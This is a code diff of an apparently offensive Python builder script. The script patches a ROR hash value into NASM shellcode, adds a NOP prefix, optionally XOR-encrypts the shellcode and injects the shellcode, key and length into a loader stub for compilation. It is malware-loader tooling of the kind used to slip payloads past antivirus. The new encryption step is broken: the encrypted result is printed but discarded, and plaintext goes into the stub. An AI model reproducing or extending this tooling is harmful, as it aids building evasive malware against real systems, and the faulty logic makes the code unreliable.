@@ -7,18 +7,20 @@ config.read(".conf")
 
 # Access values
 ROR_VALUE = config.getint("Payload", "ror_value")
+ENCRYPTION_KEY = config.get("Payload", "encryption_key")
 PAYLOAD_FILE = config.get("Payload", "filepath")
 STUB_FILE = config.get("Loader", "stub")
 
 WORKING_FOLDER = "temp/"
 
-
+SHELLCODE_PREFIX = "909090"
 
 def main():
-    print("=====CONFIG=====")
+    print("===========CONFIG==========")
     print(f"ROR value: {ROR_VALUE}")
-    print("=================")
-    print()
+    print(f"Encryption key: {ENCRYPTION_KEY}")
+    print("===========================\n")
+
     print("===========PAYLOAD==============")
     sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", f"byte {hex(ROR_VALUE)}")
     remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)
@@ -31,13 +33,26 @@ def main():
 
     instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
     nb_bytes = int(len(instructions)/2)
-    print()
     print(f"Shellcode length: {nb_bytes} bytes")
-    print("================================")
+    print("================================\n")
 
-    #Replace the shellcode in the loader
+    # Encrypt the shellcode
+    if ENCRYPTION_KEY != "":
+        print("===========ENCRYPTION==============")
+        print(instructions)
+        print("\nthen\n")
+        encrypted_instructions = xor_encrypt_decrypt(instructions, ENCRYPTION_KEY)
+        print(encrypted_instructions)
+        print("===================================\n")
+
+    instructions = SHELLCODE_PREFIX+instructions
+
+    # Replace the final shellcode in the loader
     sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
+    sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", ENCRYPTION_KEY)
+    sed_file(WORKING_FOLDER+STUB_FILE, "%LENGTH%", str(int(len(SHELLCODE_PREFIX)/2)+nb_bytes))
 
+    print("\n================COMPILATION===============")
 
 
 if __name__ == "__main__":
